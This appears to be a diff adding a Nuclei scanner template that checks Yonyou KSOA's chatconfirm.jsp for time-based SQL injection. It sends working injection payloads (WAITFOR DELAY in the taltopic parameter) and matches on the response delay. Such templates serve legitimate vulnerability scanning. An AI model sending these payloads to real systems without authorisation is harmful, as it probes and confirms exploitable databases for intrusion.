@@ -1,0 +1,31 @@
+id: youyouKSOA-chatconfirm-sql
+
+info:
+  name: 用友时空KSOA chatconfirm.jsp 存在SQL注入漏洞
+  author: youyouKSOA
+  severity: high
+  tags: youyouKSOA
+
+http:
+  - raw:
+      - |+
+        GET /luntan/chatconfirm.jsp?taltopic=1';WAITFOR%20DELAY%20'0:0:2'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+
+      - |+
+        GET /luntan/chatconfirm.jsp?taltopic=1';WAITFOR%20DELAY%20'0:0:4'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+        condition: and
